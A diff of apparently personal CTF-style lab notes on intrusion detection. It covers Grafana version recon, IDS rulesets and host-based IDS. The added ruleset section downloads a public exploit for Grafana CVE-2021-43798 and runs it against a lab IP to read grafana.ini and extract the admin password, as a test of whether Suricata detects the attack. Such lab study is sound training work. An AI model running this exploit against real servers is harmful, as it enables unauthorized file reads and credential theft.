@@ -74,7 +74,7 @@ Information may also be gathered from the target site and related assets if they
 - Additional information on the tools used by the target may be available in job listings;
 
 Q) What version of Grafana is the server running?
-	Grafana is running bt default on port 3000 -> v.8.2.5
+	Grafana is running by default on port 3000 -> v.8.2.5
 	
 Q) What is the ID of the severe CVE that affects this version of Grafana?
 	CVE-2021-43798
@@ -84,3 +84,25 @@ Q) If this server was publicly available, What site might have information on it
 
 Q) How would we search the site "example.com" for pdf files, using advanced Google search tags?
 	`site:example.com filetype:pdf`
+
+## **Rulesets**
+Any signature-based IDS is ultimately reliant, on the quality of its ruleset; attack signatures must be well defined, tested, and consistently applied otherwise, it is likely that an attack will remain undetected. It is also important that the rule set be, kept up to date in order to reduce the time between a new exploit being discovered and its signatures being loaded into deployed IDS.  Ruleset development is difficult and, all rule sets especially, ones deployed in NIDS will never completely accurate. Inaccurate rules sets may generate false positives or false negatives with both failures affecting the security of the assets under the protection of an IDS.
+
+In this case, we have identified that one of the target assets is affected by a critical vulnerability which, will allow us to by-parse authentication and gain read access to almost any file on the system. It's been a while since this [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2021-43798) was made public so its signature is available in the Emerging Threats Open ruleset which is loaded by default in Suricata. Let's run this exploit and see if we are detected;
+
+https://github.com/jas502n/Grafana-CVE-2021-43798
+
+`wget https://raw.githubusercontent.com/Jroo1053/GrafanaDirInclusion/master/src/exploit.py`
+
+`python3 exploit.py -u 10.10.107.199 -p 3000 -f <REMOTE FILE TO READ>`
+
+Q) What is the password of the grafana-admin account?
+	`python3 exploit.py -u 10.10.107.199 -p 3000 -f /etc/grafana/grafana.ini | grep 'password'`
+
+## **Host Based IDS (HIDS)**
+Not all forms of malicious activity involve network traffic that could be detected by a NIDS, ransomware, for example, could be disturbed via an external email service provider installed and executed on a target machine and, only be detected by a NIDS once, it calls home with messages of its success which, of course, is way too late. For this reason, it is often advisable to deploy a host-based IDS alongside a NIDS to check for suspicious activity that occurs on devices and not just over the network including:
+- Malware execution
+- System configuration changes
+- Software errors
+- File integrity changes
+- Privilege escalation
